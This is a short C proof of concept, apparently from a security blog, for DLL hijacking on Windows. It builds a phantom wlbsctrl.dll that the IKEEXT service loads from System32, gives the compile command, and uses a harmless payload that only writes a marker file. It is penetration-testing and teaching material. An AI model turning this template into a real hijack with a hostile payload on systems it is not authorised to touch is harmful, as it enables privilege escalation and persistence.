/*
Name        : wlbsctrl.c
Description : DLL Hijacking PoC that creates a file.
              Phantom DLL "C:\Windows\System32\wlbsctrl.dll"
Compile 64  : x86_64-w64-mingw32-gcc -shared -o wlbsctrl.dll wlbsctrl.c
Examples    : IKEEXT service
Author      : Lisandre.com
Date        : 2025-04-15
*/
#include <windows.h>
#include <stdio.h>

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        FILE* f = fopen("C:\\Users\\Public\\dllhijack.txt", "w");
        if (f != NULL) {
            fprintf(f, ">>> DLL Hijacking: It works!\n");
            fclose(f);
        }
    }
    return TRUE;
}
